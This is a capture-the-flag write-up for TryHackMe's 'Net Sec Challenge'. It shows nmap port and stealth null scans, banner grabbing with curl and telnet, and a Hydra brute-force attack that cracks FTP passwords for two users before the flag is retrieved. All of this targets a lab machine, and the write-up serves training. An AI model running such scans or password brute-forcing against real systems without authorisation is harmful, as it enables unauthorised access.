# Net Sec Challenge:TryHackMe

By: Onyedikachi Okoh

## INTRODUCTION

This challenge is designed to assess your competency in the Network Security module. All problems may be completed using only the tools N**map**, T**elnet**, and Hydra.

**Launch the AttackBox and the target VM.**

### Challenge Questions

You can answer the following questions using Nmap, Telnet, and Hydra.

1. What is the highest port number that is open less than 10,000?

```bash
sudo nmap -sS -sV -p- -T4 --open 10.10.126.---
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:43 EDT
Nmap scan report for THM (10.10.126.83)
Host is up (0.54s latency).
Not shown: 64762 closed tcp ports (reset), 767 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
----/tcp  open  http        Node.js (Express middleware)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.95%I=7%D=11/1%Time=69067191%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{---------------}\x20\r\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds
                                    
```

2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?

```bash
sudo nmap -sS -sV -p- -T4 --open 10.10.126.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:43 EDT
Nmap scan report for THM (10.10.126.83)
Host is up (0.54s latency).
Not shown: 64762 closed tcp ports (reset), 767 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
----/tcp  open  http        Node.js (Express middleware)
----/tcp open  ftp         ------------------
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.95%I=7%D=11/1%Time=69067191%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{-------------}\x20\r\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds
```

1. How many TCP ports are open?

```bash

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
----/tcp  open  http        Node.js (Express middleware)
----/tcp open  ftp          ------------

```

4. What is the flag hidden in the HTTP server header?

```bash
curl -I http://10.10.126.83
HTTP/1.1 200 OK
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Sat, 01 Nov 2025 19:31:41 GMT
Server: lighttpd THM{---server_-----}
```

5.What is the flag hidden in the SSH server header?

```bash
telnet 10.10.126.83 22
Trying 10.10.126.83...
Connected to 10.10.126.83.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{-------------}
```

6.We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

```bash
ftp 10.10.126.83 ----1
Connected to 10.10.126.83.
220 (----- 3.0.5)
Name (10.10.126.83:kalib): quinn
331 Please specify the password.
Password: 
230 Login successful.
```

1. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?

```bash
hydra -L USERS.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.126.83:----1
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 16:56:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://10.10.126.83:----1/
[10021][ftp] host: 10.10.126.83   login: eddie   password: -----n
[10021][ftp] host: 10.10.126.83   login: quinn   password: -----a
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 16:57:10
```

```bash
ftp 10.10.126.83 ----1
Connected to 10.10.126.83.
220 (vsFTPd 3.0.5)
Name (10.10.126.83:kalib): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30312|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> ascii
200 Switching to ASCII mode.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30661|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |*****************************|    18      128.30 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 1 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
18 bytes received in 00:00 (0.08 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
cat ftp_flag.txt
THM{-------------}
```

8. Browsing to `http://10.10.126.83:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

```bash
nmap -sN -oN out.txt 10.10.126.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 17:56 EDT
Nmap scan report for THM (10.10.126.83)
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
----/tcp open|filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```

![get_flag_with_null2.png](get_flag_with_null2.png)
